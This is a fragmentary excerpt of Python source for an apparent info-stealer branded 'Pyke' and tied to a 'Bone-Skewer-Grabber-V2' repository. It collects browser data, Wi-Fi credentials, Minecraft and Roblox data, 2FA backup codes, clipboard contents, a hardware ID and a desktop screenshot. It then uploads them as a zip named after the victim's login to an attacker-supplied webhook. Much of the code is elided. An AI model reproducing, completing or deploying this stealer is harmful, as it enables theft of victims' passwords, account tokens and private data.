...
def main(webhook: str):
    threads = [Browsers, Wifi, Minecraft, BackupCodes, Clipboard,
    ...
    data = {
        "username": "Pyke",
        "avatar_url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber-V2/main/gui_images/avatar.png"
    }
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes", "clipboard"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (
                f'Pyke-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
class PcInfo:
    ...
    def get_inf(self, webhook):
        ...
        hwid = subprocess.check_output(r'C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid',
            ...
            "embeds": [
                {
                    ...
                    "thumbnail": {
                        "url": "https://raw.githubusercontent.com/Entity378/Bone-Skewer-Grabber-V2/main/gui_images/avatar.png"
                    }
                }
            ],
            "username": "Pyke",
    ...
    def upload(self, webhook):
        ...
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            ...
            encoder = MultipartEncoder({'payload_json': json.dumps(
                webhook_data), 'file': ('image.png', image_data, 'image/png')})
